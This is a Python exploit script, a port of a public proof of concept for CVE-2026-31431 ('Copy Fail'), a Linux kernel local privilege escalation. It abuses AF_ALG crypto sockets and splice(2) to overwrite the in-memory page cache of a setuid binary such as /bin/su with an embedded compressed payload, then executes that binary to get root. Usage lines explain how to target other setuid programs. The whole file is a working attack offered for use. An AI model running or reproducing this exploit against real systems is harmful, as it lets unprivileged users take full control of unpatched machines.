#!/usr/bin/env python3
# copy_fail.py — CVE-2026-31431 ("Copy Fail") without os.splice.
#
# The original 732-byte PoC calls os.splice, which only exists in Python 3.10+.
# This version calls the very same splice(2) syscall through libc via ctypes,
# so it runs on Python 3.6-3.9. Crypto parameters, cmsg layout, offsets and the
# payload blob are unchanged.
#
# Upstream: https://github.com/theori-io/copy-fail-CVE-2026-31431
#   original sha256: a567d09b15f6e4440e70c9f2aa8edec8ed59f53301952df05c719aa3911687f9
#
# Usage:
#   ./copy_fail.py                # patch /bin/su and execve it
#   ./copy_fail.py -n             # patch only, compare sha256, no execve
#   ./copy_fail.py /usr/bin/passwd          # another setuid target
#   ./copy_fail.py /usr/bin/passwd -n       # dry run against another target
#
# x86-64 only. Kernel must be >= 4.14 and without fix a664bf3d603d.
# No root, no sudo, no user namespaces, no disk writes.

import os
import sys
import zlib
import socket
import ctypes
import ctypes.util
import hashlib

TARGET = next((a for a in sys.argv[1:] if not a.startswith("-")), "/bin/su")
DOEXEC = "-n" not in sys.argv


def d(x):
    return bytes.fromhex(x)


# --- libc.splice ------------------------------------------------------------

_libc = None
for cand in ("libc.so.6", ctypes.util.find_library("c")):
    if not cand:
        continue
    try:
        _libc = ctypes.CDLL(cand, use_errno=True)
        break
    except OSError:
        pass
if _libc is None:
    sys.exit("no libc")

_libc.splice.argtypes = [
    ctypes.c_int,
    ctypes.POINTER(ctypes.c_longlong),
    ctypes.c_int,
    ctypes.POINTER(ctypes.c_longlong),
    ctypes.c_size_t,
    ctypes.c_uint,
]
_libc.splice.restype = ctypes.c_ssize_t

EAGAIN = 11


def sp_in(fd_in, fd_out, count, off0):
    """file -> pipe, reading at off0 without moving the file offset"""
    off = ctypes.c_longlong(off0)
    p = ctypes.pointer(off)
    done = 0
    while done < count:
        off.value = off0 + done
        r = _libc.splice(fd_in, p, fd_out, None, count - done, 0)
        if r < 0:
            e = ctypes.get_errno()
            if e == EAGAIN:
                continue
            raise OSError(e, os.strerror(e))
        if r == 0:
            break
        done += r
    return done


def sp_out(fd_in, fd_out, count):
    """pipe -> socket"""
    done = 0
    while done < count:
        r = _libc.splice(fd_in, None, fd_out, None, count - done, 0)
        if r < 0:
            e = ctypes.get_errno()
            if e == EAGAIN:
                continue
            raise OSError(e, os.strerror(e))
        if r == 0:
            break
        done += r
    return done


# --- one 4-byte page-cache write --------------------------------------------

def chunk(fd, t, val):
    a = socket.socket(38, 5, 0)  # AF_ALG, SOCK_SEQPACKET
    try:
        a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        h = 279  # SOL_ALG
        a.setsockopt(h, 1, d("0800010000000010" + "0" * 64))  # ALG_SET_KEY
        a.setsockopt(h, 5, None, 4)                           # ALG_SET_AEAD_AUTHSIZE = 4
        u, _ = a.accept()

        o = t + 4                      # splice length; write lands at assoclen+cryptlen = t+4
        z = d("00")
        u.sendmsg(
            [b"A" * 4 + val],          # AAD: 4 filler bytes + 4 bytes to write (seqno_lo)
            [
                (h, 3, z * 4),         # ALG_SET_OP = 0 (decrypt)
                (h, 2, b"\x10" + z * 19),  # ALG_SET_IV: ivlen 16 + zero IV
                (h, 4, b"\x08" + z * 3),   # ALG_SET_AEAD_ASSOCLEN = 8
            ],
            32768,                     # MSG_MORE
        )

        r, w = os.pipe()
        try:
            sp_in(fd, w, o, 0)
            sp_out(r, u.fileno(), o)
        finally:
            os.close(r)
            os.close(w)

        try:
            u.recv(8 + t)              # triggers decrypt; HMAC fails, write persists
        except OSError:
            pass
        u.close()
    finally:
        a.close()


def sha(p):
    h = hashlib.sha256()
    with open(p, "rb") as fh:
        for b in iter(lambda: fh.read(65536), b""):
            h.update(b)
    return h.hexdigest()


# --- main -------------------------------------------------------------------

print("[*] target: %s" % TARGET)
st = os.stat(TARGET)
print("[*] mode %o setuid=%s" % (st.st_mode & 0o7777, bool(st.st_mode & 0o4000)))

try:
    s = socket.socket(38, 5, 0)
    s.close()
    print("[+] AF_ALG ok")
except OSError as ex:
    sys.exit("[!] AF_ALG blocked: %s" % ex)

try:
    if "authencesn" not in open("/proc/crypto").read():
        print("[!] authencesn not in /proc/crypto (bind may still work)")
except Exception:
    pass

before = sha(TARGET)
print("[*] sha256 before: %s" % before)

e = zlib.decompress(d(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e"
    "07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa49"
    "9979fac5190c0c0c0032c310d3"
))
print("[*] payload %d bytes" % len(e))
if len(e) % 4:
    print("[!] payload length not 4-aligned, last chunk will write junk")

fd = os.open(TARGET, os.O_RDONLY)
try:
    i = 0
    while i < len(e):
        chunk(fd, i, e[i:i + 4])
        i += 4
finally:
    os.close(fd)

after = sha(TARGET)
print("[*] sha256 after : %s" % after)
print("[+] page cache %s" % ("PATCHED" if after != before else "UNCHANGED"))

if DOEXEC:
    print("[*] exec %s" % TARGET)
    sys.stdout.flush()
    os.execv(TARGET, [os.path.basename(TARGET)])